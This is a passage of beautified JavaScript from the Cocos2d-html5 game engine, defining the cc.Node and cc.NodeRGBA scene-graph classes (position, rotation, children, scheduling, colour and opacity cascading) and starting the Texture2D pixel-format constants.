	cc.defineGetterSetter(a, "running", a.isRunning);
	cc.defineGetterSetter(a, "ignoreAnchor", a.isIgnoreAnchorPointForPosition, a.ignoreAnchorPointForPosition);
	cc.defineGetterSetter(a, "actionManager", a.getActionManager, a.setActionManager);
	cc.defineGetterSetter(a, "scheduler", a.getScheduler, a.setScheduler);
	cc.defineGetterSetter(a, "shaderProgram", a.getShaderProgram, a.setShaderProgram);
	cc.defineGetterSetter(a, "glServerState", a.getGLServerState, a.setGLServerState)
};
cc._tmp.PrototypeCCNodeRGBA = function() {
	var a = cc.NodeRGBA.prototype;
	cc.defineGetterSetter(a, "opacity", a.getOpacity, a.setOpacity);
	cc.defineGetterSetter(a, "opacityModifyRGB", a.isOpacityModifyRGB, a.setOpacityModifyRGB);
	cc.defineGetterSetter(a, "cascadeOpacity", a.isCascadeOpacityEnabled, a.setCascadeOpacityEnabled);
	cc.defineGetterSetter(a, "color", a.getColor, a.setColor);
	cc.defineGetterSetter(a, "cascadeColor", a.isCascadeColorEnabled, a.setCascadeColorEnabled)
};
cc.NODE_TAG_INVALID = -1;
cc.s_globalOrderOfArrival = 1;
cc.Node = cc.Class.extend({
	_localZOrder: 0,
	_globalZOrder: 0,
	_vertexZ: 0,
	_rotationX: 0,
	_rotationY: 0,
	_scaleX: 1,
	_scaleY: 1,
	_position: null,
	_skewX: 0,
	_skewY: 0,
	_children: null,
	_visible: !0,
	_anchorPoint: null,
	_anchorPointInPoints: null,
	_contentSize: null,
	_running: !1,
	_parent: null,
	_ignoreAnchorPointForPosition: !1,
	tag: cc.NODE_TAG_INVALID,
	userData: null,
	userObject: null,
	_transformDirty: !0,
	_inverseDirty: !0,
	_cacheDirty: !0,
	_cachedParent: null,
	_transformGLDirty: null,
	_transform: null,
	_inverse: null,
	_reorderChildDirty: !1,
	_shaderProgram: null,
	arrivalOrder: 0,
	_actionManager: null,
	_scheduler: null,
	_eventDispatcher: null,
	_initializedNode: !1,
	_additionalTransformDirty: !1,
	_additionalTransform: null,
	_componentContainer: null,
	_isTransitionFinished: !1,
	_rotationRadiansX: 0,
	_rotationRadiansY: 0,
	_className: "Node",
	_showNode: !1,
	_name: "",
	_initNode: function() {
		this._anchorPoint = cc.p(0, 0);
		this._anchorPointInPoints = cc.p(0, 0);
		this._contentSize = cc.size(0, 0);
		this._position = cc.p(0, 0);
		this._children = [];
		this._transform = {
			a: 1,
			b: 0,
			c: 0,
			d: 1,
			tx: 0,
			ty: 0
		};
		var a = cc.director;
		this._actionManager = a.getActionManager();
		this._scheduler = a.getScheduler();
		this._initializedNode = !0;
		this._additionalTransform = cc.AffineTransformMakeIdentity();
		cc.ComponentContainer && (this._componentContainer = new cc.ComponentContainer(this))
	},
	init: function() {
		!1 === this._initializedNode && this._initNode();
		return !0
	},
	_arrayMakeObjectsPerformSelector: function(a, b) {
		if (a && 0 !== a.length) {
			var c, d = a.length,
				e;
			c = cc.Node.StateCallbackType;
			switch (b) {
			case c.onEnter:
				for (c = 0; c < d; c++) if (e = a[c]) e.onEnter();
				break;
			case c.onExit:
				for (c = 0; c < d; c++) if (e = a[c]) e.onExit();
				break;
			case c.onEnterTransitionDidFinish:
				for (c = 0; c < d; c++) if (e = a[c]) e.onEnterTransitionDidFinish();
				break;
			case c.cleanup:
				for (c = 0; c < d; c++)(e = a[c]) && e.cleanup();
				break;
			case c.updateTransform:
				for (c = 0; c < d; c++)(e = a[c]) && e.updateTransform();
				break;
			case c.onExitTransitionDidStart:
				for (c = 0; c < d; c++) if (e = a[c]) e.onExitTransitionDidStart();
				break;
			case c.sortAllChildren:
				for (c = 0; c < d; c++)(e = a[c]) && e.sortAllChildren();
				break;
			default:
				cc.assert(0, cc._LogInfos.Node__arrayMakeObjectsPerformSelector)
			}
		}
	},
	setNodeDirty: null,
	attr: function(a) {
		for (var b in a) this[b] = a[b]
	},
	getSkewX: function() {
		return this._skewX
	},
	setSkewX: function(a) {
		this._skewX = a;
		this.setNodeDirty()
	},
	getSkewY: function() {
		return this._skewY
	},
	setSkewY: function(a) {
		this._skewY = a;
		this.setNodeDirty()
	},
	setLocalZOrder: function(a) {
		this._localZOrder = a;
		this._parent && this._parent.reorderChild(this, a);
		cc.eventManager._setDirtyForNode(this)
	},
	_setLocalZOrder: function(a) {
		this._localZOrder = a
	},
	getLocalZOrder: function() {
		return this._localZOrder
	},
	getZOrder: function() {
		cc.log(cc._LogInfos.Node_getZOrder);
		return this.getLocalZOrder()
	},
	setZOrder: function(a) {
		cc.log(cc._LogInfos.Node_setZOrder);
		this.setLocalZOrder(a)
	},
	setGlobalZOrder: function(a) {
		this._globalZOrder != a && (this._globalZOrder = a, cc.eventManager._setDirtyForNode(this))
	},
	getGlobalZOrder: function() {
		return this._globalZOrder
	},
	getVertexZ: function() {
		return this._vertexZ
	},
	setVertexZ: function(a) {
		this._vertexZ = a
	},
	getRotation: function() {
		this._rotationX !== this._rotationY && cc.log(cc._LogInfos.Node_getRotation);
		return this._rotationX
	},
	setRotation: function(a) {
		this._rotationX = this._rotationY = a;
		this._rotationRadiansX = 0.017453292519943295 * this._rotationX;
		this._rotationRadiansY = 0.017453292519943295 * this._rotationY;
		this.setNodeDirty()
	},
	getRotationX: function() {
		return this._rotationX
	},
	setRotationX: function(a) {
		this._rotationX = a;
		this._rotationRadiansX = 0.017453292519943295 * this._rotationX;
		this.setNodeDirty()
	},
	getRotationY: function() {
		return this._rotationY
	},
	setRotationY: function(a) {
		this._rotationY = a;
		this._rotationRadiansY = 0.017453292519943295 * this._rotationY;
		this.setNodeDirty()
	},
	getScale: function() {
		this._scaleX !== this._scaleY && cc.log(cc._LogInfos.Node_getScale);
		return this._scaleX
	},
	setScale: function(a, b) {
		this._scaleX = a;
		this._scaleY = b || 0 === b ? b : a;
		this.setNodeDirty()
	},
	getScaleX: function() {
		return this._scaleX
	},
	setScaleX: function(a) {
		this._scaleX = a;
		this.setNodeDirty()
	},
	getScaleY: function() {
		return this._scaleY
	},
	setScaleY: function(a) {
		this._scaleY = a;
		this.setNodeDirty()
	},
	setPosition: function(a, b) {
		var c = this._position;
		void 0 === b ? (c.x = a.x, c.y = a.y) : (c.x = a, c.y = b);
		this.setNodeDirty()
	},
	getPosition: function() {
		return cc.p(this._position)
	},
	getPositionX: function() {
		return this._position.x
	},
	setPositionX: function(a) {
		this._position.x = a;
		this.setNodeDirty()
	},
	getPositionY: function() {
		return this._position.y
	},
	setPositionY: function(a) {
		this._position.y = a;
		this.setNodeDirty()
	},
	getChildrenCount: function() {
		return this._children.length
	},
	getChildren: function() {
		return this._children
	},
	isVisible: function() {
		return this._visible
	},
	setVisible: function(a) {
		this._visible = a;
		this.setNodeDirty()
	},
	getAnchorPoint: function() {
		return this._anchorPoint
	},
	setAnchorPoint: function(a, b) {
		var c = this._anchorPoint;
		if (void 0 === b) {
			if (a.x === c.x && a.y === c.y) return;
			c.x = a.x;
			c.y = a.y
		} else {
			if (a === c.x && b === c.y) return;
			c.x = a;
			c.y = b
		}
		var d = this._anchorPointInPoints,
			e = this._contentSize;
		d.x = e.width * c.x;
		d.y = e.height * c.y;
		this.setNodeDirty()
	},
	_getAnchor: function() {
		return this._anchorPoint
	},
	_setAnchor: function(a) {
		var b = a.x;
		a = a.y;
		this._anchorPoint.x !== b && (this._anchorPoint.x = b, this._anchorPointInPoints.x = this._contentSize.width * b);
		this._anchorPoint.y !== a && (this._anchorPoint.y = a, this._anchorPointInPoints.y = this._contentSize.height * a);
		this.setNodeDirty()
	},
	_getAnchorX: function() {
		return this._anchorPoint.x
	},
	_setAnchorX: function(a) {
		this._anchorPoint.x !== a && (this._anchorPoint.x = a, this._anchorPointInPoints.x = this._contentSize.width * a, this.setNodeDirty())
	},
	_getAnchorY: function() {
		return this._anchorPoint.y
	},
	_setAnchorY: function(a) {
		this._anchorPoint.y !== a && (this._anchorPoint.y = a, this._anchorPointInPoints.y = this._contentSize.height * a, this.setNodeDirty())
	},


	getAnchorPointInPoints: function() {
		return this._anchorPointInPoints
	},
	_getWidth: function() {
		return this._contentSize.width
	},
	_setWidth: function(a) {
		this._contentSize.width = a;
		this._anchorPointInPoints.x = a * this._anchorPoint.x;
		this.setNodeDirty()
	},
	_getHeight: function() {
		return this._contentSize.height
	},
	_setHeight: function(a) {
		this._contentSize.height = a;
		this._anchorPointInPoints.y = a * this._anchorPoint.y;
		this.setNodeDirty()
	},
	getContentSize: function() {
		return this._contentSize
	},
	setContentSize: function(a, b) {
		var c = this._contentSize;
		if (void 0 === b) {
			if (a.width === c.width && a.height === c.height) return;
			c.width = a.width;
			c.height = a.height
		} else {
			if (a === c.width && b === c.height) return;
			c.width = a;
			c.height = b
		}
		var d = this._anchorPointInPoints,
			e = this._anchorPoint;
		d.x = c.width * e.x;
		d.y = c.height * e.y;
		this.setNodeDirty()
	},
	isRunning: function() {
		return this._running
	},
	getParent: function() {
		return this._parent
	},
	setParent: function(a) {
		this._parent = a
	},
	isIgnoreAnchorPointForPosition: function() {
		return this._ignoreAnchorPointForPosition
	},
	ignoreAnchorPointForPosition: function(a) {
		a != this._ignoreAnchorPointForPosition && (this._ignoreAnchorPointForPosition = a, this.setNodeDirty())
	},
	getTag: function() {
		return this.tag
	},
	setTag: function(a) {
		this.tag = a
	},
	setName: function(a) {
		this._name
	},
	getName: function() {
		return this._name
	},
	getUserData: function() {
		return this.userData
	},
	setUserData: function(a) {
		this.userData = a
	},
	getUserObject: function() {
		return this.userObject
	},
	setUserObject: function(a) {
		this.userObject != a && (this.userObject = a)
	},
	getOrderOfArrival: function() {
		return this.arrivalOrder
	},
	setOrderOfArrival: function(a) {
		this.arrivalOrder = a
	},
	getActionManager: function() {
		this._actionManager || (this._actionManager = cc.director.getActionManager());
		return this._actionManager
	},
	setActionManager: function(a) {
		this._actionManager != a && (this.stopAllActions(), this._actionManager = a)
	},
	getScheduler: function() {
		this._scheduler || (this._scheduler = cc.director.getScheduler());
		return this._scheduler
	},
	setScheduler: function(a) {
		this._scheduler != a && (this.unscheduleAllCallbacks(), this._scheduler = a)
	},
	getBoundingBox: function() {
		var a = cc.rect(0, 0, this._contentSize.width, this._contentSize.height);
		return cc._RectApplyAffineTransformIn(a, this.nodeToParentTransform())
	},
	cleanup: function() {
		this.stopAllActions();
		this.unscheduleAllCallbacks();
		cc.eventManager.removeListeners(this);
		this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.cleanup)
	},
	getChildByTag: function(a) {
		var b = this._children;
		if (null != b) for (var c = 0; c < b.length; c++) {
			var d = b[c];
			if (d && d.tag == a) return d
		}
		return null
	},
	getChildByName: function(a) {
		if (!a) return cc.log("Invalid name"), null;
		for (var b = this._children, c = 0, d = b.length; c < d; c++) if (b[c]._name == a) return b[c];
		return null
	},
	addChild: function(a, b, c) {
		cc.assert(a, cc._LogInfos.Node_addChild_3);
		if (a === this) cc.log(cc._LogInfos.Node_addChild);
		else if (null !== a._parent) cc.log(cc._LogInfos.Node_addChild_2);
		else if (b = null != b ? b : a._localZOrder, a.tag = null != c ? c : a.tag, this._insertChild(a, b), a._parent = this, this._cachedParent && (a._cachedParent = this._cachedParent), this._running && (a.onEnter(), this._isTransitionFinished)) a.onEnterTransitionDidFinish()
	},
	removeFromParent: function(a) {
		this._parent && (null == a && (a = !0), this._parent.removeChild(this, a))
	},
	removeFromParentAndCleanup: function(a) {
		cc.log(cc._LogInfos.Node_removeFromParentAndCleanup);
		this.removeFromParent(a)
	},
	removeChild: function(a, b) {
		0 !== this._children.length && (null == b && (b = !0), -1 < this._children.indexOf(a) && this._detachChild(a, b), this.setNodeDirty())
	},
	removeChildByTag: function(a, b) {
		a === cc.NODE_TAG_INVALID && cc.log(cc._LogInfos.Node_removeChildByTag);
		var c = this.getChildByTag(a);
		null == c ? cc.log(cc._LogInfos.Node_removeChildByTag_2, a) : this.removeChild(c, b)
	},
	removeAllChildrenWithCleanup: function(a) {
		cc.log(cc._LogInfos.Node_removeAllChildrenWithCleanup);
		this.removeAllChildren(a)
	},
	removeAllChildren: function(a) {
		var b = this._children;
		if (null != b) {
			null == a && (a = !0);
			for (var c = 0; c < b.length; c++) {
				var d = b[c];
				d && (this._running && (d.onExitTransitionDidStart(), d.onExit()), a && d.cleanup(), d.parent = null)
			}
			this._children.length = 0
		}
	},
	_detachChild: function(a, b) {
		this._running && (a.onExitTransitionDidStart(), a.onExit());
		b && a.cleanup();
		a.parent = null;
		cc.arrayRemoveObject(this._children, a)
	},
	_insertChild: function(a, b) {
		this._reorderChildDirty = !0;
		this._children.push(a);
		a._setLocalZOrder(b)
	},
	reorderChild: function(a, b) {
		cc.assert(a, cc._LogInfos.Node_reorderChild);
		this._reorderChildDirty = !0;
		a.arrivalOrder = cc.s_globalOrderOfArrival;
		cc.s_globalOrderOfArrival++;
		a._setLocalZOrder(b);
		this.setNodeDirty()
	},
	sortAllChildren: function() {
		if (this._reorderChildDirty) {
			var a = this._children,
				b = a.length,
				c, d, e;
			for (c = 1; c < b; c++) {
				e = a[c];
				for (d = c - 1; 0 <= d;) {
					if (e._localZOrder < a[d]._localZOrder) a[d + 1] = a[d];
					else if (e._localZOrder === a[d]._localZOrder && e.arrivalOrder < a[d].arrivalOrder) a[d + 1] = a[d];
					else break;
					d--
				}
				a[d + 1] = e
			}
			this._reorderChildDirty = !1
		}
	},
	draw: function(a) {},
	transformAncestors: function() {
		null != this._parent && (this._parent.transformAncestors(), this._parent.transform())
	},
	onEnter: function() {
		this._isTransitionFinished = !1;
		this._running = !0;
		this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onEnter);
		this.resume()
	},
	onEnterTransitionDidFinish: function() {
		this._isTransitionFinished = !0;
		this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onEnterTransitionDidFinish)
	},
	onExitTransitionDidStart: function() {
		this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onExitTransitionDidStart)
	},
	onExit: function() {
		this._running = !1;
		this.pause();
		this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onExit);
		this._componentContainer && this._componentContainer.removeAll()
	},
	runAction: function(a) {
		cc.assert(a, cc._LogInfos.Node_runAction);
		this.actionManager.addAction(a, this, !this._running);
		return a
	},
	stopAllActions: function() {
		this.actionManager && this.actionManager.removeAllActionsFromTarget(this)
	},
	stopAction: function(a) {
		this.actionManager.removeAction(a)
	},
	stopActionByTag: function(a) {
		a === cc.ACTION_TAG_INVALID ? cc.log(cc._LogInfos.Node_stopActionByTag) : this.actionManager.removeActionByTag(a, this)
	},
	getActionByTag: function(a) {
		return a === cc.ACTION_TAG_INVALID ? (cc.log(cc._LogInfos.Node_getActionByTag), null) : this.actionManager.getActionByTag(a, this)
	},
	getNumberOfRunningActions: function() {
		return this.actionManager.numberOfRunningActionsInTarget(this)
	},
	scheduleUpdate: function() {
		this.scheduleUpdateWithPriority(0)
	},
	scheduleUpdateWithPriority: function(a) {
		this.scheduler.scheduleUpdateForTarget(this, a, !this._running)
	},
	unscheduleUpdate: function() {
		this.scheduler.unscheduleUpdateForTarget(this)
	},
	schedule: function(a, b, c, d) {
		b = b || 0;
		cc.assert(a, cc._LogInfos.Node_schedule);
		cc.assert(0 <= b, cc._LogInfos.Node_schedule_2);
		c = null == c ? cc.REPEAT_FOREVER : c;
		this.scheduler.scheduleCallbackForTarget(this, a, b, c, d || 0, !this._running)
	},
	scheduleOnce: function(a, b) {
		this.schedule(a, 0, 0, b)
	},
	unschedule: function(a) {
		a && this.scheduler.unscheduleCallbackForTarget(this, a)
	},
	unscheduleAllCallbacks: function() {
		this.scheduler.unscheduleAllCallbacksForTarget(this)
	},
	resumeSchedulerAndActions: function() {
		cc.log(cc._LogInfos.Node_resumeSchedulerAndActions);
		this.resume()
	},
	resume: function() {
		this.scheduler.resumeTarget(this);
		this.actionManager && this.actionManager.resumeTarget(this);
		cc.eventManager.resumeTarget(this)
	},
	pauseSchedulerAndActions: function() {
		cc.log(cc._LogInfos.Node_pauseSchedulerAndActions);
		this.pause()
	},
	pause: function() {
		this.scheduler.pauseTarget(this);
		this.actionManager && this.actionManager.pauseTarget(this);
		cc.eventManager.pauseTarget(this)
	},
	setAdditionalTransform: function(a) {
		this._additionalTransform = a;
		this._additionalTransformDirty = this._transformDirty = !0
	},
	parentToNodeTransform: function() {
		this._inverseDirty && (this._inverse = cc.AffineTransformInvert(this.nodeToParentTransform()), this._inverseDirty = !1);
		return this._inverse
	},
	nodeToWorldTransform: function() {
		for (var a = this.nodeToParentTransform(), b = this._parent; null != b; b = b.parent) a = cc.AffineTransformConcat(a, b.nodeToParentTransform());
		return a
	},
	worldToNodeTransform: function() {
		return cc.AffineTransformInvert(this.nodeToWorldTransform())
	},
	convertToNodeSpace: function(a) {
		return cc.PointApplyAffineTransform(a, this.worldToNodeTransform())
	},
	convertToWorldSpace: function(a) {
		a = a || cc.p(0, 0);
		return cc.PointApplyAffineTransform(a, this.nodeToWorldTransform())
	},
	convertToNodeSpaceAR: function(a) {
		return cc.pSub(this.convertToNodeSpace(a), this._anchorPointInPoints)
	},
	convertToWorldSpaceAR: function(a) {
		a = a || cc.p(0, 0);
		a = cc.pAdd(a, this._anchorPointInPoints);
		return this.convertToWorldSpace(a)
	},
	_convertToWindowSpace: function(a) {
		a = this.convertToWorldSpace(a);
		return cc.director.convertToUI(a)
	},
	convertTouchToNodeSpace: function(a) {
		a = a.getLocation();
		return this.convertToNodeSpace(a)
	},
	convertTouchToNodeSpaceAR: function(a) {
		a = a.getLocation();
		a = cc.director.convertToGL(a);
		return this.convertToNodeSpaceAR(a)
	},
	update: function(a) {
		this._componentContainer && !this._componentContainer.isEmpty() && this._componentContainer.visit(a)
	},
	updateTransform: function() {
		this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.updateTransform)
	},
	retain: function() {},
	release: function() {},
	getComponent: function(a) {
		return this._componentContainer.getComponent(a)
	},
	addComponent: function(a) {
		this._componentContainer.add(a)
	},
	removeComponent: function(a) {
		return this._componentContainer.remove(a)
	},
	removeAllComponents: function() {
		this._componentContainer.removeAll()
	},
	grid: null,
	ctor: null,
	visit: null,
	transform: null,
	nodeToParentTransform: null,
	_setNodeDirtyForCache: function() {
		if (!1 === this._cacheDirty) {
			this._cacheDirty = !0;
			var a = this._cachedParent;
			a && a != this && a._setNodeDirtyForCache()
		}
	},
	_setCachedParent: function(a) {
		if (this._cachedParent != a) {
			this._cachedParent = a;
			for (var b = this._children, c = 0, d = b.length; c < d; c++) b[c]._setCachedParent(a)
		}
	},
	getCamera: function() {
		this._camera || (this._camera = new cc.Camera);
		return this._camera
	},
	getGrid: function() {
		return this.grid
	},
	setGrid: function(a) {
		this.grid = a
	},
	getShaderProgram: function() {
		return this._shaderProgram
	},
	setShaderProgram: function(a) {
		this._shaderProgram = a
	},
	getGLServerState: function() {
		return this._glServerState
	},
	setGLServerState: function(a) {
		this._glServerState = a
	},
	getBoundingBoxToWorld: function() {
		var a = cc.rect(0, 0, this._contentSize.width, this._contentSize.height),
			b = this.nodeToWorldTransform(),
			a = cc.RectApplyAffineTransform(a, this.nodeToWorldTransform());
		if (!this._children) return a;
		for (var c = this._children, d = 0; d < c.length; d++) {
			var e = c[d];
			e && e._visible && (e = e._getBoundingBoxToCurrentNode(b)) && (a = cc.rectUnion(a, e))
		}
		return a
	},
	_getBoundingBoxToCurrentNode: function(a) {
		var b = cc.rect(0, 0, this._contentSize.width, this._contentSize.height);
		a = null == a ? this.nodeToParentTransform() : cc.AffineTransformConcat(this.nodeToParentTransform(), a);
		b = cc.RectApplyAffineTransform(b, a);
		if (!this._children) return b;
		for (var c = this._children, d = 0; d < c.length; d++) {
			var e = c[d];
			e && e._visible && (e = e._getBoundingBoxToCurrentNode(a)) && (b = cc.rectUnion(b, e))
		}
		return b
	},
	_nodeToParentTransformForWebGL: function() {
		if (this._transformDirty) {
			var a = this._position.x,
				b = this._position.y,
				c = this._anchorPointInPoints.x,
				d = -c,
				e = this._anchorPointInPoints.y,
				f = -e,
				g = this._scaleX,
				h = this._scaleY;
			this._ignoreAnchorPointForPosition && (a += c, b += e);
			var k = 1,
				l = 0,
				m = 1,
				n = 0;
			if (0 !== this._rotationX || 0 !== this._rotationY) k = Math.cos(-this._rotationRadiansX), l = Math.sin(-this._rotationRadiansX), m = Math.cos(-this._rotationRadiansY), n = Math.sin(-this._rotationRadiansY);
			var q = this._skewX || this._skewY;
			if (!q && (0 !== c || 0 !== e)) a += m * d * g + -l * f * h, b += n * d * g + k * f * h;
			var r = this._transform;
			r.a = m * g;
			r.b = n * g;
			r.c = -l * h;
			r.d = k * h;
			r.tx = a;
			r.ty = b;
			if (q && (r = cc.AffineTransformConcat({
				a: 1,
				b: Math.tan(cc.degreesToRadians(this._skewY)),
				c: Math.tan(cc.degreesToRadians(this._skewX)),
				d: 1,
				tx: 0,
				ty: 0
			}, r), 0 !== c || 0 !== e)) r = cc.AffineTransformTranslate(r, d, f);
			this._additionalTransformDirty && (r = cc.AffineTransformConcat(r, this._additionalTransform), this._additionalTransformDirty = !1);
			this._transform = r;
			this._transformDirty = !1
		}
		return this._transform
	}
});
cc.Node.create = function() {
	return new cc.Node
};
cc.Node.StateCallbackType = {
	onEnter: 1,
	onExit: 2,
	cleanup: 3,
	onEnterTransitionDidFinish: 4,
	updateTransform: 5,
	onExitTransitionDidStart: 6,
	sortAllChildren: 7
};
if (cc._renderType === cc._RENDER_TYPE_CANVAS) {
	var _p = cc.Node.prototype;
	_p.ctor = function() {
		this._initNode()
	};
	_p.setNodeDirty = function() {
		this._setNodeDirtyForCache();
		!1 === this._transformDirty && (this._transformDirty = this._inverseDirty = !0)
	};
	_p.visit = function(a) {
		if (this._visible) {
			a = a || cc._renderContext;
			var b, c = this._children,
				d;
			a.save();
			this.transform(a);
			var e = c.length;
			if (0 < e) {
				this.sortAllChildren();
				for (b = 0; b < e; b++) if (d = c[b], 0 > d._localZOrder) d.visit(a);
				else break;
				for (this.draw(a); b < e; b++) c[b].visit(a)
			} else this.draw(a);
			this._cacheDirty = !1;
			this.arrivalOrder = 0;
			a.restore()
		}
	};
	_p.transform = function(a) {
		a = a || cc._renderContext;
		var b = cc.view,
			c = this.nodeToParentTransform();
		a.transform(c.a, c.c, c.b, c.d, c.tx * b.getScaleX(), -c.ty * b.getScaleY())
	};
	_p.nodeToParentTransform = function() {
		if (this._transformDirty) {
			var a = this._transform;
			a.tx = this._position.x;
			a.ty = this._position.y;
			var b = 1,
				c = 0;
			this._rotationX && (b = Math.cos(this._rotationRadiansX), c = Math.sin(this._rotationRadiansX));
			a.a = a.d = b;
			a.b = -c;
			a.c = c;
			var d = this._scaleX,
				e = this._scaleY,
				f = this._anchorPointInPoints.x,
				g = this._anchorPointInPoints.y,
				h = 1E-6 > d && -1E-6 < d ? 1E-6 : d,
				k = 1E-6 > e && -1E-6 < e ? 1E-6 : e;
			if (this._skewX || this._skewY) {
				var l = Math.tan(-this._skewX * Math.PI / 180),
					m = Math.tan(-this._skewY * Math.PI / 180);
				Infinity === l && (l = 99999999);
				Infinity === m && (m = 99999999);
				var n = g * l * h,
					q = f * m * k;
				a.a = b + -c * m;
				a.b = b * l + -c;
				a.c = c + b * m;
				a.d = c * l + b;
				a.tx += b * n + -c * q;
				a.ty += c * n + b * q
			}
			if (1 !== d || 1 !== e) a.a *= h, a.c *= h, a.b *= k, a.d *= k;
			a.tx += b * -f * h + -c * g * k;
			a.ty -= c * -f * h + b * g * k;
			this._ignoreAnchorPointForPosition && (a.tx += f, a.ty += g);
			this._additionalTransformDirty && (this._transform = cc.AffineTransformConcat(a, this._additionalTransform), this._additionalTransformDirty = !1);
			this._transformDirty = !1
		}
		return this._transform
	};
	_p = null
} else cc.assert("function" === typeof cc._tmp.WebGLCCNode, cc._LogInfos.MissingFile, "BaseNodesWebGL.js"), cc._tmp.WebGLCCNode(), delete cc._tmp.WebGLCCNode;
cc.assert("function" === typeof cc._tmp.PrototypeCCNode, cc._LogInfos.MissingFile, "BaseNodesPropertyDefine.js");
cc._tmp.PrototypeCCNode();
delete cc._tmp.PrototypeCCNode;
cc.NodeRGBA = cc.Node.extend({
	RGBAProtocol: !0,
	_displayedOpacity: 255,
	_realOpacity: 255,
	_displayedColor: null,
	_realColor: null,
	_cascadeColorEnabled: !1,
	_cascadeOpacityEnabled: !1,
	ctor: function() {
		cc.Node.prototype.ctor.call(this);
		this._realOpacity = this._displayedOpacity = 255;
		this._displayedColor = cc.color(255, 255, 255, 255);
		this._realColor = cc.color(255, 255, 255, 255);
		this._cascadeOpacityEnabled = this._cascadeColorEnabled = !1
	},
	_updateColor: function() {},
	getOpacity: function() {
		return this._realOpacity
	},
	getDisplayedOpacity: function() {
		return this._displayedOpacity
	},
	setOpacity: function(a) {
		this._displayedOpacity = this._realOpacity = a;
		var b = 255,
			c = this._parent;
		c && (c.RGBAProtocol && c.cascadeOpacity) && (b = c.getDisplayedOpacity());
		this.updateDisplayedOpacity(b);
		this._displayedColor.a = this._realColor.a = a
	},
	updateDisplayedOpacity: function(a) {
		this._displayedOpacity = this._realOpacity * a / 255;
		if (this._cascadeOpacityEnabled) {
			a = this._children;
			for (var b = 0; b < a.length; b++) {
				var c = a[b];
				c && c.RGBAProtocol && c.updateDisplayedOpacity(this._displayedOpacity)
			}
		}
	},
	isCascadeOpacityEnabled: function() {
		return this._cascadeOpacityEnabled
	},
	setCascadeOpacityEnabled: function(a) {
		this._cascadeOpacityEnabled !== a && ((this._cascadeOpacityEnabled = a) ? this._enableCascadeOpacity() : this._disableCascadeOpacity())
	},
	_enableCascadeOpacity: function() {
		var a = 255,
			b = this._parent;
		b && (b.RGBAProtocol && b.cascadeOpacity) && (a = b.getDisplayedOpacity());
		this.updateDisplayedOpacity(a)
	},
	_disableCascadeOpacity: function() {
		this._displayedOpacity = this._realOpacity;
		for (var a = this._children, b = 0; b < a.length; b++) {
			var c = a[b];
			c && c.RGBAProtocol && c.updateDisplayedOpacity(255)
		}
	},
	getColor: function() {
		var a = this._realColor;
		return cc.color(a.r, a.g, a.b, a.a)
	},
	getDisplayedColor: function() {
		var a = this._displayedColor;
		return cc.color(a.r, a.g, a.b, a.a)
	},
	setColor: function(a) {
		var b = this._displayedColor,
			c = this._realColor;
		b.r = c.r = a.r;
		b.g = c.g = a.g;
		b.b = c.b = a.b;
		b = (b = this._parent) && b.RGBAProtocol && b.cascadeColor ? b.getDisplayedColor() : cc.color.WHITE;
		this.updateDisplayedColor(b);
		void 0 !== a.a && !a.a_undefined && this.setOpacity(a.a)
	},
	updateDisplayedColor: function(a) {
		var b = this._displayedColor,
			c = this._realColor;
		b.r = 0 | c.r * a.r / 255;
		b.g = 0 | c.g * a.g / 255;
		b.b = 0 | c.b * a.b / 255;
		if (this._cascadeColorEnabled) {
			a = this._children;
			for (c = 0; c < a.length; c++) {
				var d = a[c];
				d && d.RGBAProtocol && d.updateDisplayedColor(b)
			}
		}
	},
	isCascadeColorEnabled: function() {
		return this._cascadeColorEnabled
	},
	setCascadeColorEnabled: function(a) {
		this._cascadeColorEnabled !== a && ((this._cascadeColorEnabled = a) ? this._enableCascadeColor() : this._disableCascadeColor())
	},
	_enableCascadeColor: function() {
		var a;
		a = (a = this._parent) && a.RGBAProtocol && a.cascadeColor ? a.getDisplayedColor() : cc.color.WHITE;
		this.updateDisplayedColor(a)
	},
	_disableCascadeColor: function() {
		var a = this._displayedColor,
			b = this._realColor;
		a.r = b.r;
		a.g = b.g;
		a.b = b.b;
		for (var a = this._children, b = cc.color.WHITE, c = 0; c < a.length; c++) {
			var d = a[c];
			d && d.RGBAProtocol && d.updateDisplayedColor(b)
		}
	},
	addChild: function(a, b, c) {
		cc.Node.prototype.addChild.call(this, a, b, c);
		this._cascadeColorEnabled && this._enableCascadeColor();
		this._cascadeOpacityEnabled && this._enableCascadeOpacity()
	},
	setOpacityModifyRGB: function(a) {},
	isOpacityModifyRGB: function() {
		return !1
	}
});
cc.NodeRGBA.create = function() {
	var a = new cc.NodeRGBA;
	a.init();
	return a
};
cc.assert("function" === typeof cc._tmp.PrototypeCCNodeRGBA, cc._LogInfos.MissingFile, "BaseNodesPropertyDefine.js");
cc._tmp.PrototypeCCNodeRGBA();
delete cc._tmp.PrototypeCCNodeRGBA;
cc.Node.ON_ENTER = 0;
cc.Node.ON_EXIT = 1;
cc.Node.ON_ENTER_TRANSITION_DID_FINISH = 2;
cc.Node.ON_EXIT_TRANSITOIN_DID_START = 3;
cc.Node.ON_CLEAN_UP = 4;
cc._tmp.PrototypeTexture2D = function() {
	var a = cc.Texture2D;
	a.PVRImagesHavePremultipliedAlpha = function(a) {
		cc.PVRHaveAlphaPremultiplied_ = a
	};
	a.PIXEL_FORMAT_RGBA8888 = 2;
	a.PIXEL_FORMAT_RGB888 = 3;
	a.PIXEL_FORMAT_RGB565 = 4;
	a.PIXEL_FORMAT_A8 = 5;
	a.PIXEL_FORMAT_I8 = 6;
	a.PIXEL_FORMAT_AI88 = 7;
	a.PIXEL_FORMAT_RGBA4444 = 8;
	a.PIXEL_FORMAT_RGB5A1 = 7;
	a.PIXEL_FORMAT_PVRTC4 = 9;
	a.PIXEL_FORMAT_PVRTC2 = 10;
	a.PIXEL_FORMAT_DEFAULT = a.PIXEL_FORMAT_RGBA8888;
	var b = cc.Texture2D._M = {};
	b[a.PIXEL_FORMAT_RGBA8888] = "RGBA8888";
	b[a.PIXEL_FORMAT_RGB888] = "RGB888";
	b[a.PIXEL_FORMAT_RGB565] = "RGB565";
	b[a.PIXEL_FORMAT_A8] = "A8";
	b[a.PIXEL_FORMAT_I8] = "I8";
	b[a.PIXEL_FORMAT_AI88] = "AI88";
